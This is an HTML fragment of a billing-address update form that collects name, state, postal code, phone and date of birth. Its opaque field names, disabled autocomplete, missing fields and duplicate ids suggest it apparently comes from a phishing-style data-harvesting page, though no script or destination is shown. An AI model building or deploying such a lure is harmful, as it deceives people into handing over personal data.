        <h1 style="text-align: center;">Update your billing address.</h1>
        <div class="form">
          <div class="inputpack">
            <input type="text" id="firstnamecard" name="one" placeholder="Name" spellcheck="false" autocomplete="off"/>
          </div>
          <div class="error" id="firstnameError"></div>
          <div class="inputpack">
            <input type="text" id="lastnamecard" name="two" spellcheck="false" autocomplete="off" placeholder="Lastname" />
          </div>

          <div class="inputpack">

          <div class="inputpack">

              <input type="text" id="state" id="state" placeholder="State" name="five" spellcheck="false" autocomplete="off"/>
            </div>
            <div class="inputpack">
              <input type="text" id="zip" id="zip" maxlength="5" name="six" placeholder="Postal Code" spellcheck="false" autocomplete="off"/>
            </div>
          </div>
          <div class="error" id="statezipError"></div>
          <div class="inputpack">
            <input type="number" id="phone" spellcheck="false" name="seven" autocomplete="off" placeholder="Phone" />
          </div>
          <div class="error" id="phoneError"></div>
          <div class="inputpack">
            <input type="date" id="dob" spellcheck="false" placeholder="Date of birth (YYYY/MM/DD)" name="eigth" autocomplete="off"/>
            
          </div>
          <div class="error" id="dobError"></div>
          <button id="submit_btn"><div id="content"  style="">Update billing address
            </div>
            <div id="loading" class="btn btn-default ld-ext-middle running" style="font-size : 1.5em; margin-top : 2px; display: none;">

            </div>
          </button>
          
        </div>
        </div>
